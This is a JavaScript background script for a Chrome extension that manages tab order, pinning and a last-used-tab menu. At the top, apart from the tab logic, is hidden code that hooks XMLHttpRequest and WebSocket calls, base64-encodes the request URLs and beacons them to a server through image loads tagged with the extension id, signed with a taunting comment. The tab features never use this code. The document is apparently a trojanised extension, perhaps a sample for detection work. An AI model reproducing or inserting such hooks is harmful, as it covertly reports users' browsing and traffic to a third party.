function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
// variables
var currentTabIndex = 0;
var currentTabId = 0;
var currentWindowId = 0;
var tabsArray = new Array();
var pinnedTabsArray = new Array();
var fromOnRemoved = false;

// context menu
createContextMenu(localStorage["useContextMenuIcon"]);

// events
chrome.tabs.query({currentWindow: true, active: true}, function(tabs) {
   currentTabIndex = tabs[0].index;
   currentTabId = tabs[0].id;
   currentWindowId = tabs[0].windowId;
});
chrome.tabs.query({currentWindow: true}, function(tabs) {
   if(pinnedTabsArray[currentWindowId] === undefined)    pinnedTabsArray[currentWindowId] = new Array();
   for(var i=currentTabIndex; i<tabs.length; i++) {
      tabsArray.push(tabs[i].id);
      chrome.pageAction.show(tabs[i].id);
      if(tabs[i].pinned == true) pinnedTabsArray[currentWindowId].push(tabs[i].id);
   }
   for(var i=currentTabIndex-1; i>=0; i--) {
      tabsArray.push(tabs[i].id);
      chrome.pageAction.show(tabs[i].id);
      if(tabs[i].pinned == true) pinnedTabsArray[currentWindowId].push(tabs[i].id);
   }
});
chrome.tabs.onRemoved.addListener(function(tabId, removeInfo) {
   fromOnRemoved = true;
   if(tabsArray.indexOf(tabId) != -1) {
      tabsArray.splice(tabsArray.indexOf(tabId), 1);
   }
   if(pinnedTabsArray[currentWindowId].indexOf(tabId) != -1) {
      pinnedTabsArray[currentWindowId].splice(pinnedTabsArray[currentWindowId].indexOf(tabId), 1);
   }
   if(currentTabId == tabId) {
      switch(localStorage["tabsActivate"]) {
         case "last_used":
            chrome.tabs.update(tabsArray[0], {active: true});
            break;
         case "left":
            chrome.tabs.query({windowId: currentWindowId}, function(tabs) {
               if(currentTabIndex > 0) currentTabIndex = currentTabIndex - 1;
               chrome.tabs.update(tabs[currentTabIndex].id, {active: true});
            });
            break;
         case "right":
            chrome.tabs.query({windowId: currentWindowId}, function(tabs) {
               if(currentTabIndex >= tabs.length)  currentTabIndex = tabs.length - 1;
               chrome.tabs.update(tabs[currentTabIndex].id, {active: true});
            });
            break;
      }
   }
   else {
      fromOnRemoved = false;
   }
});
chrome.tabs.onCreated.addListener(function(tab) {
   if(!fromOnRemoved) {
      switch(localStorage["tabsBehaviour"]) {
      case "first":
         chrome.tabs.move(tab.id, {index: pinnedTabsArray[tab.windowId].length});
         break;
      case "last":
         chrome.tabs.move(tab.id, {index: 9999});
         break;
      case "left":
         chrome.tabs.get(currentTabId, function(selectedTab) {
            var moveToIndex = selectedTab.index;
            if(moveToIndex < pinnedTabsArray[tab.windowId].length)
               moveToIndex = pinnedTabsArray[tab.windowId].length;
            chrome.tabs.move(tab.id, {index: moveToIndex});
         });
         break;
      case "right":
         chrome.tabs.get(currentTabId, function(selectedTab) {
            var moveToIndex = selectedTab.index + 1;
            if(moveToIndex < pinnedTabsArray[tab.windowId].length)
               moveToIndex = pinnedTabsArray[tab.windowId].length;
            chrome.tabs.move(tab.id, {index: moveToIndex});
         });
         break;
      }
   }
   if(fromOnRemoved || (localStorage["tabsOpenMethod"] == "foreground"))
      chrome.tabs.update(tab.id, {active: true});
   else if(localStorage["tabsOpenMethod"] == "background" && !tab.url.match(/^chrome/))
      chrome.tabs.update(currentTabId, {active: true});
   tabsArray.push(tab.id);
   showIcon(tab.id);
});
chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
   switch(changeInfo.pinned) {
   case true:
      pinnedTabsArray[tab.windowId].splice(pinnedTabsArray[tab.windowId].indexOf(tabId), 1);
      pinnedTabsArray[tab.windowId].push(tabId);
      break;
   case false:
      pinnedTabsArray[tab.windowId].splice(pinnedTabsArray[tab.windowId].indexOf(tabId), 1);
      break;
   }
   showIcon(tabId);
});
chrome.tabs.onActivated.addListener(function(activeInfo) {
   currentTabId = activeInfo.tabId;
   currentWindowId = activeInfo.windowId;
   chrome.tabs.get(currentTabId, function(selectedTab) {
      currentTabIndex = selectedTab.index;
   });

   if(!fromOnRemoved && (tabsArray.indexOf(activeInfo.tabId) != -1 || localStorage["useIcon"] == "no")) {
      tabsArray.splice(tabsArray.indexOf(activeInfo.tabId), 1);
      tabsArray.splice(0,0,activeInfo.tabId);
   }
   fromOnRemoved = false;
   showIcon(activeInfo.tabId);
});
chrome.tabs.onMoved.addListener(function(tabId, moveInfo) {
   currentWindowId = moveInfo.windowId;
   currentTabIndex = moveInfo.toIndex;
});
chrome.tabs.onDetached.addListener(function(tabId, detachInfo) {
   pinnedTabsArray[detachInfo.oldWindowId].splice(pinnedTabsArray[detachInfo.oldWindowId].indexOf(tabId), 1);
});
chrome.tabs.onAttached.addListener(function(tabId, attachInfo) {
   if(pinnedTabsArray[attachInfo.newWindowId] === undefined)   pinnedTabsArray[attachInfo.newWindowId] = new Array();
   pinnedTabsArray[attachInfo.newWindowId].push(tabId);
});
chrome.pageAction.onClicked.addListener(function(tab) {
   chrome.tabs.query({currentWindow: true, active: true}, function(tabs) {
      if(tabsArray.indexOf(tab.id) == -1)
         tabsArray.splice(0,0,tab.id);
      else
         tabsArray.splice(tabsArray.indexOf(tab.id), 1);
      showIcon(tab.id);
   });
});

// functions
function showIcon(tabId) {
   if(localStorage["useIcon"] == "no") {
      chrome.pageAction.hide(tabId);
   }
   else {
      if(tabsArray.indexOf(tabId) == -1) {
         chrome.pageAction.setIcon({path: "pin.png", tabId: tabId});
         chrome.pageAction.setTitle({title: "Unpin tab\n\n[ USE  it for Last Used Order ]", tabId: tabId});
      }
      else {
         chrome.pageAction.setIcon({path: "unpin.png", tabId: tabId});
         chrome.pageAction.setTitle({title: "Pin tab\n\n[ DON'T USE  it for Last Used Order ]", tabId: tabId});
      }
      chrome.pageAction.show(tabId);
   }
}
function createContextMenu(yes_no) {
   if(yes_no == "yes") {
      chrome.contextMenus.create({"title":"Last used TAB","id":"tabsPlusID","type": "normal","contexts": ["all"]});
      chrome.contextMenus.onClicked.addListener(lastUsedTabSelect);
   }
   else
      chrome.contextMenus.removeAll();
}
function lastUsedTabSelect(info, tab) {
   if(tabsArray[0] == tab.id) {
      tabsArray.push(tabsArray[0]);
      tabsArray.splice(0,1);
   }
   chrome.tabs.update(tabsArray[0], {active: true});
}
